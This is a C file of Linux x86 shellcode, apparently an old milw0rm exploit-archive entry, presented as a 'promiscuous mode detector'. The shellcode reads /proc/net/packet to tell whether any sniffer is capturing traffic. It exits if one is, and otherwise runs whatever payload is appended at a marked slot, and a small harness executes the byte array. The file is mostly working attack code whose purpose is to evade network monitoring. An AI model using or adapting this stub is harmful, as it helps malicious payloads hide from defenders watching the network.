/*
 â–â–„âˆ™ â–„  â–„â–„â–„ .  â– â–„         âˆ™ â–Œ â–„ Â·.  â–„âˆ™ â–„â–Œ â–„â–„â–„â–„â–„  â–„â–„â–„Â·
  â–ˆâ–Œâ–ˆâ–Œâ–  â–€â–„.â–€Â· âˆ™â–ˆâ–Œâ–â–ˆ â–       Â·â–ˆâ–ˆ â–â–ˆâ–ˆâ–ˆâ–  â–ˆâ– â–ˆâ–ˆâ–Œ âˆ™â–ˆâ–ˆ   â–â–ˆ â–€â–ˆ
  Â·â–ˆâ–ˆÂ·  â–â–€â–€â– â–„ â–â–ˆâ–â–â–Œ  â–„â–ˆâ–€â–„  â–â–ˆ â–Œâ–â–Œâ–â–ˆÂ· â–ˆâ–Œâ–â–ˆâ–Œ  â–â–ˆ.â–  â–„â–ˆâ–€â–€â–ˆ
 â– â–â–ˆÂ·â–ˆâ–Œ â–â–ˆâ–„â–„â–Œ â–ˆâ–ˆâ–â–ˆâ–Œ â–â–ˆâ–Œ.â–â–Œ â–ˆâ–ˆ â–ˆâ–ˆâ–Œâ–â–ˆâ–Œ â–â–ˆâ–„â–ˆâ–Œ  â–â–ˆâ–ŒÂ· â–â–ˆ â– â–â–Œ
 âˆ™â–€â–€ â–€â–€  â–€â–€â–€  â–€â–€ â–ˆâ–   â–€â–ˆâ–„â–€â–  â–€â–€  â–ˆâ– â–€â–€â–€  â–€â–€â–€   â–€â–€â–€   â–€  â–€

Ho' Detector (Promiscuous mode detector shellcode)
by XenoMuta <xenomuta[at]phreaker[dot]net>
http://xenomuta.tuxfamily.org/

This shellcode uses a stupid, yet effective method
for detecting sniffing on all interfaces in linux:
parsing /proc/net/packet, which contains libpcap's
stats and only one line (56 bytes) when not sniffing.
*/

char sc[]=
"\x66\x31\xC0"                // xor eax,eax
"\x66\x50"                    // push eax
"\x66\x68\x63\x6B\x65\x74"    // push dword 0x74656b63 ; cket
"\x66\x68\x74\x2F\x70\x61"    // push dword 0x61702f74 ; t/pa
"\x66\x68\x63\x2F\x6E\x65"    // push dword 0x656e2f63 ; c/ne
"\x66\x68\x2F\x70\x72\x6F"    // push dword 0x6f72702f ; /pro
"\xB0\x05"                    // mov al,0x5            ; open()
"\x66\x89\xE3"                // mov ebx,esp           ; /proc/net/packet
"\x66\x31\xC9"                // xor ecx,ecx           ; O_RDONLY
"\xCD\x80"                    // int 0x80
"\x66\x93"                    // xchg eax,ebx
"\x6A\x03"                    // push byte +0x3        ; read()
"\x66\x58"                    // pop eax
"\x66\x89\xE1"                // mov ecx,esp
"\x6A\x39"                    // push byte +0x39       ; at most 57 bytes
"\x66\x5A"                    // pop edx
"\xCD\x80"                    // int 0x80
"\x3C\x38"                    // cmp al,0x38           ; if only 56 bytes
"\x74\x06"                    // jz 0x40               ; there is no packet
"\x6A\x01"                    // push byte +0x1        ; capture. Proceed
"\x66\x58"                    // pop eax               ; with shellcode
"\xCD\x80"                    // int 0x80              ; else, exit()
/*
Append your shellcode here
*/
"\x90";

main(){(*(void (*)()) sc)();}
-----BEGIN PGP SIGNATURE-----

iEYEARECAAYFAkkjGO0ACgkQ2LnNaOYR/B1h1QCg2uatkfAzSE5Jgc3bzJmFU/3s
opMAoLufSxvFoSNl3W+6h5rxmLIcq2Mp
=ISTU
-----END PGP SIGNATURE-----

// milw0rm.com [2008-11-18]